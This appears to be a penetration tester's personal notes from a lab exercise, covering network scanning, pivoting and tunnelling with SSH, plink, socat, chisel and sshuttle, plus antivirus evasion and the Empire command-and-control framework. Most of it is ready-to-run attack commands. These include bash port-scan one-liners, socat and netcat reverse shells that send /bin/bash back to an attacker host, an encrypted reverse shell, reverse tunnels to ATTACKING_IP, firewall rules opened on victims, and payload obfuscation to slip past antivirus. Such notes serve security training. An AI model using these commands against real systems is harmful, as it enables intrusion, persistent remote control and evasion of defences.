   -  /etc/resolv.conf
   -  ifconfig - nmcli dev show / ipconfig /all
   -  port scanning
      -  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
      -  ports: for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

## Steps
- Enumerate
- Find everything that there is outside and inside
- find services running, find cve for these services
- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
- get ssh key if they are available
- upload/download files

## PIVOTING
-  from on machine to another
-  tunnelling/proxying: route all traffic (a lot of traffic)
-  port forwarding: create connection (few ports)
-  ProxyChain
- (linux) firewall-cmd --zone=public --add-port PORT/tcp
- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

### SSH
- Port Forwarding
  - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
- Proxy
  - ssh -D PORT user@[public_ip] -fN
- create key pair on the attacking machine
- transfer private key to victim
- stablish connection from victim to attacking
  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - executing on we habe the shell



- -L ==> Port FOrwarding
  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  - access FIRST through SECOND, 8000 is local port
    - -f = background
    - -N no command execution

- -D [PORT] ==> Proxy
  - open port on attacking
-Reverse Connections
  - generate ssh key
  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
  - restart ssh
  - transfer private key to target: 
  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN


### PLINK.EXE
- command line for putty
- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- convert key with puttygen: puttygen key -o xxx.ppk

### SOCAT
- Reverse shell
  - listener on the attacker
  - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
  - create reverse shell from compromised to attacker: nc localhost 8000 -e/bin/bash

- Port Forwarding - Method 1
  - open port on victim + redirect to target server = ./socat tcp-l:[port_on_victim],fork,reuseaddr tcp:[target_ip]:3306 &

- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
  - victim: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
- on victim: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect victim back to us on port 443
- on victim: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &

- Encrypted:
  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  - merge keys: cat shell.key shell.crt > shell.pem
  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 close all:
  - jobs ==> find socats processes 
  
### CHISEL
- set up tunnel proxy / port forward
  
- client / server 
  
- Reverse SOCKS Proxy
  - server: chisel server -p [port] --reverse &
  - client (victim0): ./chisel client [attacker]:8005 R:socks &
    - R = remote, client knows that server antecipate proxy
- 
- Forward SOCK Proxy
  - victim: ./chisel server -p LISTEN_PORT --socks5
  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
  
- Port Forward
  - attacker: ./chisel server -p LISTEN_PORT --reverse &
  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
  - victim to our machine: ./chisel server -p 1337 --reverse &
  
- Local Port Forward
  - compromised: ./chisel server -p LISTEN_PORT
  - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

- In the machine with evil-win open firewall port
  - cd w
  - chisel client => attacking
  - chisel server => victim

### SSHUTTLE
- easier to handle
- only linzx
- need ssh access to public interface
- sshuttle -r username@address subnet  
  - -N to guess the subnet
- No password:
  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
  - -x exclude compromised server
- Direct access to evil-winrM
  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-Reset resolved.service: sudo systemctl restart systemd-resolved.service
 
### PROXY
- proxychains
  - open port in our system linked to target
  - proxychains COMMAND [host] [port] / own conf file proxychains.conf
    - comment proxy_dns ==> cause nmap to crash
    - no Ping (-Pn) only TCP, no UDP/SYN
  
- FoxyProxy
  - better for web

## GIt enumeration
- nmap -sn ip.1-255 -oN output
- check error message in the http server
- explore folders
- find exploit
- dos2unix exploit.py OR sed -i 's/\r//' python.py
- correct the information on the exploit
- execute shell there
- execute with burp or curl
- curl -POST localhost:8000 ==> here we go to the computer we dont have access
  
- Extract .git folder
- Gittools
  - dumper: downlaod exposed .git directory from site
  - extractor: take local .git and recreate repository
  - finder: search for exposed g.t
  - Read files: 
    - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


# Antivirus Evasion
- Fundamentals
- 2 types
  - on-disk
    - execute on target
  - in memory
    - import into memory and execute. Not save in the disk
  
- Identify AV
  - Seatbelt
  - SharpEDRChecker
  - disable cloud-based protection: test our payload
  
- Obfuscate payload
  - encode string
  - split parts
  - https://www.gaijin.at/en/tools/php-obfuscator


## Cross compilation
- run programs in different platforms


## How AV Works
- Static
  - signature detection
  - byte matching: find matching sequences in the file
- Dynamic / Heuristic / Behavioural
  - line by line execution
  - pre-defined rules
  - no gan, no gui + VM = sandbox

# Empire (windows) / Starkiller
- powershell-empire server + client
  - different location:
    - /usr/share/powershell-empire/empire/client/config.yaml
    - connect HOSTNAME --username=USERNAME --password=PASSWORD
- Starkiller: app
  - user: empireadmin pass: password123
- Listener: listen connection
- Stargers: payloads for robust shell
- Agents: sessions (like metasploit)
- Modules (further agends)

- Start listener
  - uselistener [NAME]
  - set [OPTION_VALUE]
  - execute
  
- Stagers
  - usestager 
  - Place payload + execute it
  - interact NAME
  - help = display commandos
  
- Starkiller
  - GUI

## Hop Listener
- noo connection forwarding
- create files copied across compromised to target = reference back to our listener
- Every connection happens with the compromised who sends to the target

- listener [http_hop]
  - .php files that need to be sent to compromised
  - host: compromised
  - redirectlistener: existing listener that is running
  - port: the webserver will host the hop file in this port
- Create Stager: 
  - starger [multi/launcher]
    - set listener
- set files on jumpserver
  - transfer created files to compromised server
  - open port firewall
  - make sure we have the access to the target
  - use module to escalate privilege
